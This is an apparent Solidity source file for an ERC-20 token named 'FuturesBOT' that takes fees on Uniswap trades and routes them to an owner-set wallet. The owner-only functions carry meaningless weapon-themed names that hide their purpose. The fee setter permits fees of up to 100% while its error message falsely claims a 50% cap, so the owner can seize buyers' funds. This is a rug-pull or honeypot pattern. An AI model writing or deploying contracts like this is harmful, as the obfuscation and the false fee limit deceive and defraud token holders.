// SPDX-License-Identifier: No License

/* 

Telegram - 
Website - 
Twitter - 
Reddit - 
Medium - 
*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract FuturesBOT is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public RevitalizeWeaponryMetricSchema;
    uint16[3] public FinancialQuickGlanceEvaluation;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public SparkWeaponryFramework;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public ElaborateExplosionGuidelines;
    mapping (address => bool) public BlossomWebActivation;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event RevitalizeWeaponryMetricSchemaUpdated(address RevitalizeWeaponryMetricSchema);
    event ExhaustiveTradeFluctuationAudit(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event EnterpriseInspectionRecap(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);	
    event FederationRebootTweaks(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"FuturesBOT", unicode"FuturesBOT") 
    {
        address supplyRecipient = 0xE3B3488Df336659fC54f86900C4c5596B1F6A676;
        
        ZenithRiflemanFinancialFragmentation(500000000 * (10 ** decimals()) / 10);

        EnlargeMissileLimitationTactics(0xE3B3488Df336659fC54f86900C4c5596B1F6A676);
        ReinforceMaxPaceAcquisitionCap(0, 0, 0);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(RevitalizeWeaponryMetricSchema, true);

        QuickWildfireGroundPriceRevamp(500000000 * (10 ** decimals()) / 10);
        PikeSynchronizationPrinciples(100000000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 100000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0xE3B3488Df336659fC54f86900C4c5596B1F6A676);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function ZenithRiflemanFinancialFragmentation(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function FinancialGenuinenessVerification() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function EnlargeMissileLimitationTactics(address _newAddress) public onlyOwner {
        RevitalizeWeaponryMetricSchema = _newAddress;

        excludeFromFees(_newAddress, true);

        emit RevitalizeWeaponryMetricSchemaUpdated(_newAddress);
    }

    function ReinforceMaxPaceAcquisitionCap(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        FinancialQuickGlanceEvaluation = [_buyFee, _sellFee, _transferFee];

        SparkWeaponryFramework[0] = 0 + FinancialQuickGlanceEvaluation[0];
        SparkWeaponryFramework[1] = 0 + FinancialQuickGlanceEvaluation[1];
        SparkWeaponryFramework[2] = 0 + FinancialQuickGlanceEvaluation[2];
        require(SparkWeaponryFramework[0] <= 10000 && SparkWeaponryFramework[1] <= 10000 && SparkWeaponryFramework[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit ExhaustiveTradeFluctuationAudit(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = FinancialGenuinenessVerification() >= swapThreshold;
        
        if (!_swapping && !BlossomWebActivation[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(RevitalizeWeaponryMetricSchema)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit EnterpriseInspectionRecap(RevitalizeWeaponryMetricSchema, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (BlossomWebActivation[from]) {
                if (SparkWeaponryFramework[0] > 0) txType = 0;
            }
            else if (BlossomWebActivation[to]) {
                if (SparkWeaponryFramework[1] > 0) txType = 1;
            }
            else if (SparkWeaponryFramework[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * SparkWeaponryFramework[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * FinancialQuickGlanceEvaluation[txType] / SparkWeaponryFramework[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        ElaborateExplosionGuidelines = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(ElaborateExplosionGuidelines, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != ElaborateExplosionGuidelines, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        BlossomWebActivation[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit FederationRebootTweaks(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function QuickWildfireGroundPriceRevamp(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function PikeSynchronizationPrinciples(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (BlossomWebActivation[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (BlossomWebActivation[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}